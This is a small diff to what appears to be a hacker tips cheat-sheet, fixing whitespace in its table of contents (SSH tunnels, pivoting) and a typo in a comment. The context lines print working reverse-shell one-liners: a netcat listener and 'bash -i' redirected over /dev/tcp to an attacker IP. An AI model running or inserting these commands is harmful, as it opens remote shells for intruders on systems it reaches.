@@ -20,7 +20,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Almost invisible SSH](#ssh-invisible)
    1. [SSH tunnel](#ssh-tunnel)
    1. [SSH socks5 tunnel](#ssh-socks-tunnel)
-   1. [SSH to NATed host](#ssh-j) 
+   1. [SSH to NATed host](#ssh-j)
    1. [SSH pivot via ProxyJump](#ssh-pj)
 1. [Network](#network)
    1. [Discover hosts](#discover)
@@ -912,7 +912,7 @@ nc -nvlp 1524
 
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```sh
-# The the current shell is Bash already:
+# If the current shell is Bash already:
 (bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &
 # If the current shell is NOT Bash then we need:
 bash -c '(exec bash -i &>/dev/tcp/127.0.0.1/31337 0>&1) &'
